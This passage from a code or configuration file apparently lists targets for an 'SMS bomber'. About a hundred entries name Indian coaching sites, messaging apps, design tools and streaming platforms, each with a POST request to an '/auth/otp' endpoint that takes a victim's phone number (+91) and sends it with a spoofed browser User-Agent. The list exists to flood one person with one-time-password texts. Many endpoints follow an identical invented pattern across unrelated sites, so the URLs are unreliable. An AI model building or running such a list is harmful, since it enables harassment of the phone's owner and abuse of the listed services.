    {
        'name': 'Bansal_Classes_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bansalclasses.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kota_Coaching_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kotacoaching.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Alakh_Pandey_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.alakhpandey.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Physics_Wallah_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.physicswallah.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Unacademy_Plus_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.unacademyplus.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vedantu_Pro_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vedantupro.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BYJUS_Class_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.byjusclass.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Toppr_Anytime_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.topprany.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Meritnation_Plus_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.meritnationplus.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Aakash_iTutor_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.aakashitutor.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FIITJEE_Online_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fiitjeeonline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Resonance_Online_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.resonanceonline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Allen_Online_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.allenonline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Narayana_Online_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.narayanaonline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Chaitanya_Online_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.chaitanyaonline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SriChaitanya_Online_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.srichaitanyaonline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CareerPoint_Online_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.careerpointonline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bansal_Online_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bansalonline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kota_Online_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kotaonline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'WhatsApp_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://web.whatsapp.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Telegram_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://web.telegram.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Signal_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://web.signal.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Discord_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://discord.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Slack_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://slack.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Teams_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://teams.microsoft.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zoom_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://zoom.us/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_Meet_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://meet.google.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Cisco_Webex_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://webex.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Adobe_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://adobe.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Figma_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://figma.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Canva_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://canva.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sketch_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://sketch.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'InVision_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://invisionapp.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Marvel_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://marvelapp.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Proto_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://proto.io/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'UXPin_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://uxpin.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Balsamiq_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://balsamiq.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Axure_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://axure.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MockFlow_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://mockflow.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wireframe_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://wireframe.cc/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mockplus_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://mockplus.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'JustInMind_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://justinmind.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pidoco_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://pidoco.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HotGloo_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://hotgloo.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FluidUI_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://fluidui.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Framer_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://framer.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Origami_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://origami.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Principle_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://principle.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Keynote_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://keynote.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PowerPoint_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://powerpoint.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Slides_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://slides.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Prezi_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://prezi.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SlideShare_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://slideshare.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HaikuDeck_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://haikudeck.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Emaze_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://emaze.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sway_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://sway.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Visme_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://visme.co/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Beautiful_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://beautiful.ai/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gamma_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://gamma.app/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tome_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://tome.app/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pitch_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://pitch.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zight_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://zight.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Loom_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://loom.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ScreenRec_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://screenrec.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'OBS_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://obsproject.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Streamlabs_Web_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://streamlabs.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Restream_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://restream.io/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'StreamElements_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://streamelements.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Nightbot_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://nightbot.tv/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mobcrush_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mobcrush.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bigo_Live_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bigo.tv/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mico_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mico.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Azar_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.azar.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hago_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hago.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Yalla_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.yalla.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Chamet_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.chamet.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Lemo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.lemo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tumile_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tumile.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MeeLive_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.meelive.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'StarMaker_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.starmaker.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Smule_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.smule.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Starmaker_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.starmaker.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Smule_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.smule.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Triller_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.triller.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Likee_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.likee.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bigo_Live_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bigolive.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kuaishou_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kuaishou.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Douyin_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.douyin.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Helo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.helo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zili_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zili.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vigo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vigo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Uplive_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.uplive.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': '17Live_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.17live.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pococha_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pococha.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bambuser_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bambuser.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'StreamYard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.streamyard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Riverside_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.riverside.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SquadCast_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.squadcast.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
